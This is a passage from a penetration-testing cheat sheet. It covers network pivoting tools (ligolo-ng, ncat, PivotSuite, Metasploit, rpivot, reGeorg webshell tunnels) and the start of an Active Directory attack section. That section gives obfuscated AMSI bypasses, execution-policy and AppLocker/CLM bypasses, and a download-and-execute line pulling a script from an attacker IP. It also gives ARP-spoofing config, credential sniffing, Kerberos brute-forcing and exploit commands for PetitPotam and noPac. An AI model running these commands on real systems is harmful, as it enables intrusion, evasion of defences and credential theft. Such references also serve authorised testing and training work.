<p id="bkmrk-then%2C-on-the-server--0">Then, on the server select the opened session and start a new listener:</p>
<pre id="bkmrk-ligolo-ng-%C2%BB-session--0"><code class="language-bash">ligolo-ng » session
[Agent : $SESSION] » listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:11601
</code></pre>
<ul id="bkmrk-the-first-agent-will"><li>The first agent will listen on <code>0.0.0.0:1080</code>
</li>
<li>Any connections on this <code>ip:port</code> will be relayed to the <code>11601</code> TCP local port of the Ligolo-ng daemon.</li>
</ul><p id="bkmrk-then%2C-on-the-second-">Then, on the second pivot machine, run the agent and connect it to the first agent:</p>
<pre id="bkmrk-.%2Fagent--connect-%24fi"><code class="language-bash">./agent -connect $firstPivot:1080 [-ignore-cert]
</code></pre>
<p id="bkmrk-a-second-session-wil">A second session will appears on the server. Select it, and run the <code>autoroute</code> command. You can now access the final network.</p>
<h2 id="bkmrk-pivoting-with-tcp%2Fud">Pivoting with TCP/UDP</h2>
<h3 id="bkmrk-ncat-%E2%80%93-remote-port-f">Ncat – Remote Port Forwarding</h3>
<p id="bkmrk-it-works-on%3A-linux%2C--2">It works on: <strong>Linux, Windows and MacOS</strong>.</p>
<p id="bkmrk-using-ncat-in-broker">Using <a href="https://nmap.org/ncat/">Ncat </a>in broker mode to accept several clients on our machine :</p>
<pre id="bkmrk-ncat--lv---broker---"><code class="language-bash">ncat -lv --broker --max-conns 2
</code></pre>
<p id="bkmrk-then%2C-on-the-pivot-m">Then, on the pivot machine, connect to the local network and then to us:</p>
<pre id="bkmrk-ncat--v-%24attacker-31"><code class="language-bash">ncat -v $ATTACKER 31337 -c 'ncat -v $TARGET 80'
</code></pre>
<pre id="bkmrk-curl---head-http%3A%2F%2F1"><code class="language-bash">curl --head http://127.0.0.1:31337
</code></pre>
<h3 id="bkmrk-pivotsuite">PivotSuite</h3>
<p id="bkmrk-pivotsuite-is-a-tcp%2F"><a href="https://github.com/RedTeamOperations/PivotSuite">PivotSuite </a>is a TCP/UDP pivoting toolkit. But <strong>no more maintened</strong>. </p>
<p id="bkmrk-it-works-on%3A-linux%2C--3">It works on: <strong>Linux, Windows and MacOS</strong>, but It needs the Python standard libraries.</p>
<p id="bkmrk-on-the-pivot-machine-2">On the pivot machine, PivotSuite is able to pass through a corporate proxy with NTLM authentication (and Pass-The-Hash) by adding the following parameters:</p>
<pre id="bkmrk---ntlm-proxy-ip%3D%24ip-"><code class="language-bash">--ntlm-proxy-ip=$IP --ntlm-proxy-port=$PORT --username=$USERNAME --domain=$DOMAIN [--password=$PASSWORD | --hashes=$HASHES]
</code></pre>
<h4 id="bkmrk-local-port-forwardin-2">Local Port Forwarding</h4>
<p id="bkmrk-just-to-forward-port">Just to forward ports on the pivot machine. No client needed, when the server is executed it will start to forward. Useful if the compromised host is directly accessible from our pentest machine.</p>
<p id="bkmrk-on-the-pivot-machine-3">On the pivot machine:</p>
<pre id="bkmrk-pivotsuite--s--f---s"><code class="language-bash">pivotsuite -S -F --server-option=PF --forward-ip=$TARGET --forward-port=80 --server-ip=$listeningIP --server-port=8080
</code></pre>
<h4 id="bkmrk-dynamic-port-forward">Dynamic Port Forwarding</h4>
<p id="bkmrk-on-the-pivot-machine-4">On the pivot machine, run socks5:</p>
<pre id="bkmrk-pivotsuite--s--f---s-0"><code class="language-bash">pivotsuite -S -F --server-option=SP --server-ip=$listeningIP --server-port=1080

# To pass through
curl --head http://$TARGET --proxy socks5://$PIVOT:1080
</code></pre>
<h4 id="bkmrk-reverse-port-forward">Reverse Port Forwarding</h4>
<p id="bkmrk-in-this-case%2C-the-se">In this case, the server is executed on the attacker machine, and the pivot machine connect back. Useful if the compromised host is behind a Firewall / NAT and directly not accessible from our pentest machine.</p>
<pre id="bkmrk-%23-on-the-attacker-ma-5"><code class="language-bash"># On the attacker machine
pivotsuite -S -W --server-ip $listeningIP --server-port 8080

# Client on the pivot machine for remote port forwarding
pivotsuite -C -O PF -R --local-ip 127.0.0.1 --local-port 9999 --remote-ip $TARGET --remote-port 80 --server-ip $ATTACKER --server-port 8080
</code></pre>
<h4 id="bkmrk-reverse-dynamic-port">Reverse Dynamic Port Forwarding</h4>
<p id="bkmrk-on-the-attacker-mach-3">On the attacker machine:</p>
<pre id="bkmrk-pivotsuite--s--w---s"><code class="language-bash">pivotsuite -S -W --server-ip $listeningIP --server-port 8080
</code></pre>
<p id="bkmrk-our-server-is-listen"><strong>Our server is listening on all interfaces, with random ports: anyone can connect to it from anywhere.</strong></p>
<p id="bkmrk-on-the-pivot-machine-5">On the pivot machine:</p>
<pre id="bkmrk-pivotsuite--c--o-sp-"><code class="language-bash">pivotsuite -C -O SP --server-ip $ATTACKER --server-port 8080
</code></pre>
<p id="bkmrk-to-pass-through%3A">To pass through:</p>
<pre id="bkmrk-curl---head-http%3A%2F%2F%24-0"><code class="language-bash">curl --head http://$TARGET --proxy socks5://127.0.0.1:7684
</code></pre>
<h2 id="bkmrk-netsh---pivoting-wit">Netsh - Pivoting with the Windows firewall</h2>
<p id="bkmrk-useful-on-a-windows-">Useful on a Windows pivot box without SSH or other tools. Netsh is the buil-in tool utility to manage the interfaces, the firewall, and so on.</p>
<p id="bkmrk-on-the-pivot-machine-6">On the pivot machine, to allow the target machine to reach the attacker's one. On the "central" machine, all the hit on the port 80 or 4545 will be forward to the <code>connectaddress</code> on the specified port:</p>
<pre id="bkmrk-%23forward-the-port-45"><code class="language-powershell">#Forward the port 4545 for the reverse shell, and the 80 for the http server for example
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=$ATTACKER connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=$ATTACKER connectport=80

#Correctly open the port on the machine
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
</code></pre>
<h2 id="bkmrk-pivoting-with-metasp">Pivoting with Metasploit</h2>
<p id="bkmrk-obviously%2C-with-a-me">Obviously, with a Meterpreter implant it is possible to perfrom pivoting.</p>
<h3 id="bkmrk-routing-table">Routing table</h3>
<p id="bkmrk-below%2C-an-example-to">Below, an example to setup the Metasploit's routing table. First, use <em>autoroute</em> on the Meterpreter session, to add routes:</p>
<pre id="bkmrk-meterpreter-%3E-backgr"><code class="language-bash">meterpreter &gt; background
msf6 exploit(multi/handler) &gt; use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) &gt; set SESSION 1
msf6 post(multi/manage/autoroute) &gt; set SUBNET $TARGET
msf6 post(multi/manage/autoroute) &gt; set NETMASK /24
msf6 post(multi/manage/autoroute) &gt; run
</code></pre>
<p id="bkmrk-it-can-be-done-manua">It can be done manually with:</p>
<pre id="bkmrk-msf6-post%28multi%2Fmana"><code class="language-bash">msf6 post(multi/manage/autoroute) &gt; route add $TARGET 255.255.0.0 1
</code></pre>
<p id="bkmrk-routes-can-be-checke">Routes can be checked with:</p>
<pre id="bkmrk-msf6-post%28multi%2Fmana-0"><code class="language-bash">msf6 post(multi/manage/autoroute) &gt; route
</code></pre>
<p id="bkmrk-then%2C-any-metasploit">Then, any Metasploit module will be able to use the new routes.</p>
<h3 id="bkmrk-socks-proxies">Socks proxies</h3>
<p id="bkmrk-a-socks-proxy-can-be">A socks proxy can be setup with Metasploit.</p>
<pre id="bkmrk-msf6-%3E-use-auxiliary"><code class="language-bash">msf6 &gt; use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) &gt; set VERSION 4a
msf6 auxiliary(server/socks_proxy) &gt; run
</code></pre>
<p id="bkmrk-prefer-socks4a-inste">Prefer <strong>socks4a instead of socks5</strong> to limit conflicts with other tools.</p>
<p id="bkmrk-then-configure-proxy">Then configure Proxychains like this:</p>
<pre id="bkmrk-socks4-127.0.0.1-108"><code>socks4    127.0.0.1 1080
</code></pre>
<p id="bkmrk-pour-ne-pas-utiliser">Pour ne pas utiliser Proxychains :</p>
<pre id="bkmrk-curl---head-http%3A%2F%2F1-0"><code class="language-bash">curl --head http://10.42.42.2 --proxy socks4a://127.0.0.1:1081
</code></pre>
<h3 id="bkmrk-port-forwarding">Port Forwarding</h3>
<p id="bkmrk-commands-to-execute-">Commands to execute in a Meterpreter session.</p>
<h4 id="bkmrk-local-port-fowarding">Local Port Fowarding</h4>
<pre id="bkmrk-portfwd-add--l-%24loca"><code class="language-bash">portfwd add -l $localPort -p $remotePort -r $TARGET
</code></pre>
<h4 id="bkmrk-remote-port-forwardi-0">Remote Port Forwarding</h4>
<pre id="bkmrk-portfwd-add--r--l-%24l"><code class="language-bash">portfwd add -R -l $localPort -L $localIP -p $listeningPortOnPivotMachine
</code></pre>
<h3 id="bkmrk-double-pivoting-0">Double pivoting</h3>
<p id="bkmrk-we-already-have-a-pi">We already have a pivot on one machine, we have pwned a second machine on the network, and we want to use it to access a third network.</p>
<ol id="bkmrk-create-a-meterpreter"><li>Create a meterpreter payload with the first pivot machine as <code>LHOST</code>
</li>
<li>Put the handler listening on it too</li>
<li>Execute the payload on the second machine</li>
<li>With the session on the second machine, we can add an autoroute to the next subnet</li>
<li>Open a new proxy socks server on a new <code>SRVPORT</code>
</li>
</ol><h2 id="bkmrk-rpivot---pivoting-wi">Rpivot - Pivoting with Python2 and Socks4</h2>
<p id="bkmrk-rpivot-is-an-old-too"><a href="https://github.com/klsecservices/rpivot">Rpivot</a> is an old tool, <strong>no more maintened</strong>, that simply allows to setup a reverse socks proxy tunnel from the pivot machine to the attacker's one.</p>
<p id="bkmrk-the-fact-that-it-sti">The fact that it still runs under Python2.7 with Socks4 can be useful if the pivot machine is old and does not have Python3. A Windows binary is present in the releases.</p>
<p id="bkmrk-on-the-pivot-machine-7">On the pivot machine, Rpivot is able to pass through a corporate proxy with NTLM authentication (and Pass-The-Hash) by adding the following parameters:</p>
<pre id="bkmrk---ntlm-proxy-ip-%24ip-"><code class="language-bash">--ntlm-proxy-ip $IP --ntlm-proxy-port $PORT --domain $DOMAIN --username $USERNAME [--password $PASSWORD | --hashes $HASHES]
</code></pre>
<pre id="bkmrk-%23-on-the-attacker-ma-6"><code class="language-bash"># On the attacker machine, run the server
python2 server.py --server-port 8080 --server-ip $listeningInterface --proxy-ip 127.0.0.1 --proxy-port 1080

# On the pivot machine, run the client
python2 client.py --server-ip $ATTACKER --server-port 8080
</code></pre>
<p id="bkmrk-then%2C-pass-through-w">Then, pass through with socks4:</p>
<pre id="bkmrk-curl---head-http%3A%2F%2F%24-1"><code class="language-bash">curl --head http://$TARGET --proxy socks4://127.0.0.1:1080

# Or setup Proxychains
socks4    127.0.0.1 1080
</code></pre>
<p id="bkmrk-you-can-use-a-zip-ar">You can use a zip archive to deploy on the pivot machine more easily:</p>
<pre id="bkmrk-zip-rpivot.zip--r-%2A."><code class="language-bash">zip rpivot.zip -r *.py ./ntlm_auth/
# Or
7z a -r rpivot.zip *.py ./ntlm_auth/

python2 rpivot.zip server --server-port 8080 --server-ip $listeningInterface --proxy-ip 127.0.0.1 --proxy-port 1080
python2 rpivot.zip client --server-ip $ATTACKER --server-port 8080
</code></pre>
<h2 id="bkmrk-pivoting-with-a-webs">Pivoting with a WebShell</h2>
<h3 id="bkmrk-regeorg-%2F-neo-regeor">reGeorg / Neo-reGeorg / pivotnacci</h3>
<p id="bkmrk-regeorg-and-neo-rege"><a href="https://github.com/sensepost/reGeorg">reGeorg </a>and <a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a> both permits to open a socks proxy through a WebShell uploaded on a web server. Neo-reGeorg is the evolution.</p>
<p id="bkmrk-pivotnacci-is-anothe"><a href="https://github.com/blackarrowsec/pivotnacci">pivotnacci</a> is another "fork". It is still useful to know it, for example if the other agents are detected by an EDR.</p>
<p id="bkmrk-both-needs-python-to">Both needs Python to be executed. <strong>reGeorg is only compatible with Python2.7, Neo-reGeorg with Python2 and Python3.</strong></p>
<p id="bkmrk-on-the-pivot-machine-8">On the pivot machine, upload <code>tunnel.(aspx|ashx|jsp|php)</code> to the web server, like a WebShell.</p>
<p id="bkmrk-on-the-attacker-mach-4">On the attacker machine, open the tunnel</p>
<pre id="bkmrk-python2-regeorgsocks"><code class="language-bash">python2 reGeorgSocksProxy.py -p 1080 -u https://$PIVOT:443/XXX/tunnel.jsp
</code></pre>
<p id="bkmrk-to-bypass-socket-iss">To bypass socket issues, use the <strong>nosocket</strong> tunnel version:</p>
<pre id="bkmrk-python2-regeorgsocks-0"><code class="language-bash">python2 reGeorgSocksProxy.py -l 127.0.0.1 -p 1081 -u https://$PIVOT:443/XXX//tunnel.nosocket.php
</code></pre>
<p id="bkmrk-then%2C-you-can-use-al">Then, you can use all of your tools by specifying a proxy, for example with Proxychains.</p>
<p id="bkmrk-with-neo-regeorg%2C-it">With Neo-reGeorg, it is possible to generate a WebShell with password. Many other options are present, check the help.</p>
<pre id="bkmrk-%23-generate-the-websh"><code class="language-bash"># Generate the WebShells with a password
python3 neoreg.py generate -k pivotpassword

# After uploading it, connect the attacker machine like this
python3 neoreg.py -k pivotpassword -u https://$PIVOT:443/tunnel.js
</code></pre>
<p id="bkmrk-and-with-pivotnacci%2C">And with pivotnacci, after droping the agent:</p>
<pre id="bkmrk-pivotnacci-https%3A%2F%2F%24"><code class="language-bash">pivotnacci https://$PIVOT/agent.php --password $PASSWORD
</code></pre>
<h3 id="bkmrk-tunna">Tunna</h3>
<p id="bkmrk-tunna-is-an-alternat"><a href="https://github.com/SECFORCE/Tunna">Tunna</a> is an alternative to the two previous tools. It allows to create a tunnel through a WebShell. It also runs with Python.</p>
<p id="bkmrk-unstable%2C-out-of-dat">Unstable, out of date, not really recommended.</p>
<p id="bkmrk-upload-one-the-websh">Upload one the WebShell in the repository on the pivot machine, and then, on the attacker machine:</p>
<pre id="bkmrk-python-proxy.py--u-h"><code class="language-bash">python proxy.py -u https://$PIVOT/conn.aspx -l 1080
</code></pre>
<h2 id="bkmrk-pivoting-with-c2">Pivoting with C2</h2>
<p id="bkmrk-obviously%2C-all-the-c">Obviously, all the Command and Control frameworks permit to pivot. Look at their options, generally the commands are similar to <a href="https://hideandsec.sh/pivot.md#pivoting-with-metasploit">Metasploit</a>.</p>
<h2 id="bkmrk-ngrok---pivoting-wit">ngrok - Pivoting with the cloud</h2>
<p id="bkmrk-ngrok-is-a-web-servi"><a href="https://dashboard.ngrok.com/signup">ngrok </a>is a web service that allows tunneling and pivoting through their servers. This is a service that has become chargeable and requires registration, but which proved its worth when it was still free.</p>
<p id="bkmrk-many-agents-are-avai">Many agents are available on the <a href="https://github.com/NGROK">official GitHub project</a>. A Linux binary is present <a href="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip">here</a>.</p>
<pre id="bkmrk-%23-log-into-the-web-s"><code class="language-bash"># Log into the web service
./ngrok authtoken $TOKEN

# Setup port fowarding on 443
./ngrok http 443
./ngrok tcp 443
</code></pre>
<h2 id="bkmrk-tips-for-pivoting">Tips for pivoting</h2>
<h3 id="bkmrk-use-proxychains">Use Proxychains</h3>
<p id="bkmrk-update-%2Fetc%2Fproxycha">Update <code>/etc/proxychains4.conf</code> with the socks type, the IP, and the PORT where the socks proxy is listening:</p>
<pre id="bkmrk-socks5-127.0.0.1-108-1"><code>socks5    127.0.0.1 1080
</code></pre>
<p id="bkmrk-and-run%3A">And run:</p>
<pre id="bkmrk-proxychains4-curl---"><code class="language-bash">proxychains4 curl --head http://$TARGET
</code></pre>
<h3 id="bkmrk-run-nmap-through-pro">Run Nmap through Proxychains</h3>
<p id="bkmrk-scan-a-single-machin">Scan a single machine through Proxychains:</p>
<pre id="bkmrk-seq-1-65535-%7C-xargs-"><code class="language-bash">seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 $TARGET -oG $TARGET --open --append-output $TARGET -Pn -n
</code></pre>
<p id="bkmrk-scan-an-ip-range%3A">Scan an IP range:</p>
<pre id="bkmrk-seq-1-254-%7C-xargs--p"><code class="language-bash">seq 1 254 | xargs -P 50 -I cpt proxychains -q nmap --top-ports 20 -sT -T4 $RANGE.cpt -oG $RANGE.0 --open --append-output $RANGE.cpt -Pn -n
</code></pre>
<h3 id="bkmrk-obtain-a-fqdn-from-a">Obtain a FQDN from an IP</h3>
<p id="bkmrk-the-service-nip.io-a">The service <a href="https://nip.io/">nip.io</a> allows to easily generate a FQDN from a public IP address. Useful when a service cannot reach a simple IP, and you don't want to buy a domain just for a test.</p>
<p id="bkmrk-for-example%2C-10.10.1">For example, <code>10.10.10.10</code> becomes <code>10.10.10.10.nip.io</code> .</p>
<h2 id="bkmrk-references">References</h2>
<ul id="bkmrk-port-forwarding---th"><li>
<a href="https://www.thehacker.recipes/infra/pivoting/port-forwarding">Port forwarding - The Hacker Recipes</a>
</li>
<li>
<a href="https://www.thehacker.recipes/infra/pivoting/socks-proxy">SOCKS proxy - The Hacker Recipes</a>
</li>
<li>
<a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/">Network Pivoting Techniques - Internal All The Things</a>
</li>
<li>
<a href="https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29">Reverse SOCKS Proxy Using Chisel — The Easy Way - Vegard Wærp</a>
</li>
</ul>
        
            <div class="page-break"></div>
        <h1 id="chapter-30">Microsoft</h1>

                    <p>Different cheatsheets useful in Windows and Active Directory environment</p>

                                                <div class="page-break"></div>
                    <div class="chapter-hint">Microsoft</div>
                    <h1 id="page-59">Active Directory</h1>
                    <p id="bkmrk-this-cheatsheet-is-b">This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter <a href="https://twitter.com/BlWasp_"><strong>@BlWasp_</strong></a>.</p>
<p id="bkmrk-i-will-try-to-put-as">I will try to put as many links as possible at the end of the page to direct to more complete resources.</p>
<h2 id="bkmrk-misc">Misc</h2>
<h3 id="bkmrk-internal-audit-mindm">Internal audit mindmap</h3>
<p id="bkmrk-insane-mindmap-by-%40m"><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">Insane mindmap</a> by <a href="https://twitter.com/M4yFly">@M4yFly</a>.</p>
<h3 id="bkmrk-bypass-amsi">Bypass AMSI</h3>
<pre id="bkmrk-%23downgrade-powershel"><code class="language-powershell">#Downgrade PowerShell
powershell -v 2 -c "&lt;...&gt;"

#Classic
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

#Base64
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

#Force AMSI error
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)

#On PowerShell 6
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
</code></pre>
<h3 id="bkmrk-create-powershell-cr">Create PowerShell credentials</h3>
<pre id="bkmrk-%24pass-%3D-convertto-se"><code class="language-powershell">$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", $pass)
</code></pre>
<h3 id="bkmrk-decipher-secure-stri">Decipher Secure-String</h3>
<p id="bkmrk-with-the-correspondi">With the corresponding AES key</p>
<pre id="bkmrk-%24aeskey-%3D-%2849%2C-222%2C-"><code class="language-powershell">$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
$decrypted
</code></pre>
<h3 id="bkmrk-bypass-execution-pol">Bypass execution policy</h3>
<pre id="bkmrk-%23by-spawning-a-new-p"><code class="language-powershell">#By spawning a new PowerShell session in the current one
powershell -nop -exec bypass

#By disabling the execution policy in the registry
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope LocalMachine -Force

#Load a PowerShell module without confirmation prompt
Import-Module ./evil.psm1 -Force
</code></pre>
<h3 id="bkmrk-execution-context-%2F-">Execution context / AppLocker</h3>
<h4 id="bkmrk-applocker">AppLocker</h4>
<pre id="bkmrk-%23get-applocker-polic"><code class="language-powershell">#Get AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</code></pre>
<p id="bkmrk-by-default%2C-c%3A%5Cwindo">By default, <code>C:\Windows</code> is not blocked, and <code>C:\Windows\Tasks</code> is writeable by any users.</p>
<h4 id="bkmrk-bypass-constrained-l">Bypass Constrained Language Mode</h4>
<p id="bkmrk-import-bypassclm.exe">Import <code>BypassCLM.exe</code> and <code>Mono.Options.dll</code> in a directory where the AppLocker policy authorize the execution, then</p>
<pre id="bkmrk-%23get-language-mode-%24"><code class="language-powershell">#Get language mode
$ExecutionContext.SessionState.LanguageMode
#To bypass with PowerShell 6
pwsh

.\BypassCLM.exe -c "iex (new-object net.webclient).downloadstring('http://192.168.50.44/Invoke-HelloWorld.ps1')"
</code></pre>
<h3 id="bkmrk-port-forwarding">Port forwarding</h3>
<p id="bkmrk-we-can-contact-a-mac">We can contact a machine, and this one can contact another machine, but we can't contact the second machine directly from our primary machine<br>
On the "central" machine, all the hit on the port 80 or 4545 will be forward to the <code>connectaddress</code> on the specified port :</p>
<pre id="bkmrk-%23forward-the-port-45"><code class="language-powershell">#Forward the port 4545 for the reverse shell, and the 80 for the http server for example
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80

#Correctly open the port on the machine
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
</code></pre>
<h3 id="bkmrk-run-domain-commands-">Run domain commands from a non domain joined computer</h3>
<pre id="bkmrk-runas-%2Fnetonly-%2Fuser"><code class="language-batch">runas /netonly /user:DOMAIN\User1 cmd.exe
</code></pre>
<h2 id="bkmrk-initial-access">Initial Access</h2>
<p id="bkmrk-what-to-do-when-you-">What to do when you are plugged on the network without creds.</p>
<ul id="bkmrk-ntlm-authentication-"><li>NTLM authentication capture on the wire with <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-responder-%2F-inveigh">Responder or Inveigh</a> poisoning, maybe in NTLMv1 ?</li>
<li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-ntlm-and-kerberos-re">Relay the NTLM authentications</a> to interesting endpoints, be careful to the signing
<ul><li>SMB socks to list/read/write the shares</li>
<li>LDAP to dump the directory</li>
<li>LDAPS (or maybe SMB if signing not required) to add a computer account</li>
<li>...</li>
</ul></li>
<li>ARP poisoning with <strong>bettercap</strong>, can be used to poison ARP tables of targets and receive authenticated requests normally destinated to other devices. Interesting scenarios can be found <a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning#scenarios-examples">here</a>.
<ul><li>By sniffing everything on the wire with Wireshark, some secrets can be found with <strong>PCredz</strong>.</li>
</ul></li>
</ul><p id="bkmrk-first%2C-run-bettercap">First, run bettercap with this config file:</p>
<pre id="bkmrk-%23-quick-recon-of-the"><code class="language-bash"># quick recon of the network
net.probe on

# set the ARP poisoning
set arp.spoof.targets &lt;target_IP&gt;
set arp.spoof.internal true
set arp.spoof.fullduplex true

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
arp.spoof on
net.sniff on
</code></pre>
<pre id="bkmrk-sudo-.%2Fbettercap---i"><code class="language-bash">sudo ./bettercap --iface &lt;interface&gt; --caplet spoof.cap
</code></pre>
<p id="bkmrk-then-sniff-with-wire">Then sniff with Wireshark. When it is finish, save the trace in a <code>.pcap</code> file and extract the secrets:</p>
<pre id="bkmrk-python3-.%2Fpcredz--f-"><code class="language-bash">python3 ./Pcredz -f extract.pcap
</code></pre>
<ul id="bkmrk-poison-the-dhcpv6-an"><li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-mitm6">Poison the DHCPv6</a> answer to receive NTLM or Kerberos authentication
<ul><li>NTLM auths can be relayed with <code>ntlmrelayx</code>
</li>
<li>Kerberos auths can be relayed with <code>krbrelayx</code> to HTTP endpoints (ADCS, SCCM AdminService API)</li>
</ul></li>
<li>Search for a domain account
<ul><li>Look for SMB Guest and null session, and LDAP null bind</li>
<li>Perform RID cycling (look at the Active Directory - Python edition cheatsheet)</li>
<li>With SMB login bruteforce</li>
<li>With Kerbrute bruteforce</li>
</ul></li>
</ul><p id="bkmrk-allows-you-to-brutef">Allows you to bruteforce Kerberos on user accounts while indicating whether the user account exists or not. Another advantage over <code>smb_login</code> is that it doesn't correspond to the same EventId, thus bypassing potential alerts. The script can work with 2 independent lists for users and passwords, but be careful not to block accounts!</p>
<pre id="bkmrk-.%2Fkerbrute-userenum-"><code class="language-bash">./kerbrute userenum -domain domain.local users.txt
</code></pre>
<p id="bkmrk-test-for-the-top1000">Test for the Top1000 with <code>login = password</code></p>
<p id="bkmrk-possible-other-passw">Possible other passwords:</p>
<pre id="bkmrk-%28empty%29-password-p%40s"><code>(empty)
password
P@ssw0rd
</code></pre>
<ul id="bkmrk-look-for-juicy-cves-"><li>Look for juicy <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-cves">CVEs</a>
</li>
<li>Search for devices like printers, routers, or similar stuff with default creds</li>
</ul><p id="bkmrk-in-case-a-printer-%28o">In case a printer (or something similar) has an LDAP account, but use the <code>SASL</code> authentication family instead of <code>SIMPLE</code>, the classic LDAP passback exploitation with a <code>nc</code> server will not be sufficient to retrieve the credentials in clear text. Instead, use a custom LDAP server that only offer the weak <code>PLAIN</code> and <code>LOGIN</code> protocols. <a href="https://github.com/pedrojosenavasperez/ldap-passback-docker">This Docker</a> permits to operate with weak protocols.</p>
<pre id="bkmrk-docker-buildx-build-"><code class="language-bash">docker buildx build -t ldap-passback .
docker run --rm -ti -p 389:389 ldap-passback
</code></pre>
<p id="bkmrk-in-parallel%2C-listen-">In parallel, listen with tshark:</p>
<pre id="bkmrk-tshark--i-any--f-%22po"><code class="language-bash">tshark -i any -f "port 389" \
  -Y "ldap.protocolOp == 0 &amp;&amp; ldap.simple" \
  -e ldap.name -e ldap.simple -Tjson
</code></pre>
<h2 id="bkmrk-cves">CVEs</h2>
<h3 id="bkmrk-ad-oriented">AD oriented</h3>
<ul id="bkmrk-spnego-rce-%28cve-2022"><li>SPNEGO RCE (CVE-2022-37958) - No public POC for the moment</li>
<li>
<a href="https://github.com/topotam/PetitPotam">PetitPotam pre-auth</a> (CVE-2022-26925)</li>
</ul><p id="bkmrk-if-the-target-is-not">If the target is not patched, this CVE can be exploited without creds.</p>
<pre id="bkmrk-.%2Fpetitpotam.exe--pi"><code class="language-powershell">./PetitPotam.exe -pipe all &lt;attacker_IP&gt; &lt;target_IP&gt;
</code></pre>
<ul id="bkmrk-nopac-%28a.k.a.-samacc"><li>
<a href="https://github.com/cube0x0/noPac">NoPac</a> (a.k.a. SamAccountName Spoofing, CVE-2021-42278 and CVE-2021-42287)</li>
</ul><p id="bkmrk-to-exploit-these-vul">To exploit these vulnerabilities you need to already control a computer account or have the right to create a new one.</p>
<pre id="bkmrk-%23scan-for-the-vuln-."><code class="language-powershell">#Scan for the vuln
.\noPac.exe scan -domain domain.local -user user1 -pass 'password'

#Exploit it and retrieve a ST for the DC
.\noPac.exe -domain domain.local -user user1 -pass 'password' /dc dcVuln.domain.local /mAccount evilComputer /mPassword 'evilPass!' /service cifs /ptt
</code></pre>
<ul id="bkmrk-printnightmare-%28cve-"><li>
<a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">PrintNightmare</a> (CVE-2021-1675 / CVE-2021-34527)</li>
